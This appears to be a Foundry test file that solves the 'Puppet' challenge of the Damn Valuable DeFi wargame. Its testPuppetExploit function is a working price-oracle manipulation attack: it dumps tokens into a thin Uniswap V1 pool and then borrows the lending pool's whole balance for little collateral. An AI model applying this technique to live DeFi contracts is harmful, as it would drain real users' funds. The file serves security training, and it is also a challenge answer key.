// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;
    function createExchange(address token) external returns (address);
}

contract PuppetTest is Test {
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Hacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT Token");

        uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));

        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Lending Pool");

        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            DEADLINE
        );

        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );

        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        console.log("Setup complete. Uniswap pool and lending pool initialized.");
    }

    function testPuppetExploit() public {
        /**
         * EXPLOIT START
         */
        vm.startPrank(attacker);

        console.log("Attacker token balance BEFORE:", dvt.balanceOf(attacker));
        console.log("Required collateral BEFORE:",
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        );

        dvt.approve(address(uniswapExchange), type(uint256).max);

        // Dump tokens to manipulate price
        uniswapExchange.tokenToEthSwapInput(
            dvt.balanceOf(attacker),
            1,
            DEADLINE
        );

        console.log("Required collateral AFTER price manipulation:",
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        );

        uint256 borrowAmount = dvt.balanceOf(address(puppetPool));

        puppetPool.borrow{value: puppetPool.calculateDepositRequired(borrowAmount)}(
            borrowAmount
        );

        console.log("Attacker token balance AFTER:", dvt.balanceOf(attacker));

        vm.stopPrank();
        /**
         * EXPLOIT END
         */

        validation();

        console.log("Exploit successful.");
    }

    function validation() internal {
        assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal pure returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}